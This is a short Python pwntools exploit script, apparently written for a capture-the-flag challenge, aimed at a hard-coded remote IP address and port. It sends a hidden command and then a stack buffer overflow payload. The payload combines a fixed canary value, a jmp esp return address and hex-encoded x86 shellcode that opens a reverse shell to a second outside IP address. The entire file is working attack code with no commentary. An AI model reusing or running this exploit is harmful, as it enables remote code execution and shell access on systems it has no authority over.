#!/usr/bin/python
from pwn import *

#HOST = '127.0.0.1'
HOST = '54.233.105.81'
PORT = 4242

buf = 'A' * 103 + p32(0xe4ffffe4) # 103 A's then a stack canary
buf += 'A' * 4   + p32(0x80493b6)  # jmp esp

# Shellcode
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x34"
buf += "\x40\x61\xdd\x68\x02\x00\x11\x5b\x89\xe1\xb0\x66\x50"
buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73"
buf += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
buf += "\x0b\xcd\x80"

buf += 'B' * (199-len(buf))   	   # fill out the buffer to 200 bytes

conn = remote(HOST,PORT)
banner = conn.recvuntil('logged in users')
print "[*] Got banner, sending hidden command..."
conn.sendline('X')
banner = conn.recvuntil('protected!')
print "[*] Got hidden prompt, sending payload..."
conn.sendline(buf)
conn.interactive()

